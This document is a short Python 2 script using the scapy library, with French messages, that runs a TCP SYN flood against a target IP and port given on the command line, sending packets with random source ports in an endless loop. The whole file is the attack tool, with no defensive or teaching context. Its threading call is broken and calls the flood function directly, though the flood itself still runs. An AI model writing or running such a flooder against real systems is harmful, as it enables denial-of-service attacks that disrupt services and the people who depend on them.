from scapy.all import *
from time import sleep
import thread
import random
import logging

if len(sys.argv) !=4:

    print "Utilisation - ./SYNFlooding.py [IP_Target] [Port_Number] [Threads]"

    sys.exit()

target =  str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

print "SYN Flooding en cours .... CTRL+C pour arreter "

def synflood(target, port):
    while 1:
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)

for x in range (0, threads):
    thread.start_new_thread(synflood(target,port))

